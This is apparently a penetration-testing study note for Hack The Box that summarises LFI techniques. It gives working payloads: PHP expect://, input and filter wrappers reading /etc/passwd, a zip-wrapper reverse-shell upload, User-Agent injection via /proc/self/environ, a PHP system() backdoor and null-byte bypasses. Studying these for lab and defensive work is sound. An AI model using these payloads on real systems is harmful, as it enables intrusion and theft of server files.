# HTB
# Medium article
https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601
## Key Takeaways
### PHP Wrappers
#### expect
PHP expect:// allows execution of system commands, unfortunately the expect PHP module is not enabled by default.
```
www.example.com?page=expect://ls
```
#### input
The payload is sent in a POST request to the server such as:
```
www.example.com?page=php://input&cmd=ls
```
#### filter
php://filter allows a pen tester to include local files and base64 encodes the output. Therefore, any base64 output will need to be decoded to reveal the contents.
```
www.example.com?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

php://filter can also be used without base64 encoding the output using:
```
www.example.com?page=php://filter/resource=/etc/passwd
```
#### zip
The zip wrapper processes uploaded .zip files server side allowing a penetration tester to upload a zip file using a vulnerable file upload function and leverage he zip filter via an LFI to execute. A typical attack example would look like:

1. Create a PHP reverse shell

2. Compress to a .zip file

3. Upload the compressed shell payload to the server

4. Use the zip wrapper to extract the payload using: php?page=zip://path/to/file.zip%23shell

5. The above will extract the zip file to shell, if the server does not append .php rename it to shell.php instead

If the file upload function does not allow zip files to be uploaded, attempts can be made to bypass the file upload function (see: OWASP file upload testing document).

### /proc/self/environ
If it’s possible to include /proc/self/environ via a local file inclusion vulnerability, then introducing source code via the User Agent header is a possible vector. Once code has been injected into the User Agent header a local file inclusion vulnerability can be leveraged to execute /proc/self/environ and reload the environment variables, executing your reverse shell.
#### Useful Shells

Useful tiny PHP back doors for the above techniques:
```
<? system(‘uname -a’);?>
```
### Null Byte
Null byte injection bypasses application filtering within web applications by adding URL encoded “Null bytes” such as %00. Typically, this bypasses basic web application blacklist filters by adding additional null characters that are then allowed or not processed by the backend web application.

Some practical examples of null byte injection for LFI:
```
    vuln.php?page=/etc/passwd%00

    vuln.php?page=/etc/passwd%2500
```

# GitHub payload list
https://github.com/payloadbox/rfi-lfi-payload-list